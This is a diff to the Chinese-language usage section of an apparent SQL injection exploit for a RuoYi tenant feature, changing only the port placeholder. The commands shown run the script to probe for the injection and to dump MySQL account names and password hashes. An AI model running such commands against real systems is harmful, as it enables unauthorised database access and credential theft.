@@ -28,13 +28,13 @@
 pip install requests pycryptodome
 
 # 探测注入是否存在
-python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:8080 probe
+python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:<port> probe
 
 # 获取 MySQL 账号与密码哈希
-python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:8080 mysql
+python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:<port> mysql
 
 # 使用代理
-python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:8080 --proxy http://127.0.0.1:8080 probe
+python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:<port> --proxy http://127.0.0.1:8080 probe
 ```
 ![](1.png)
 
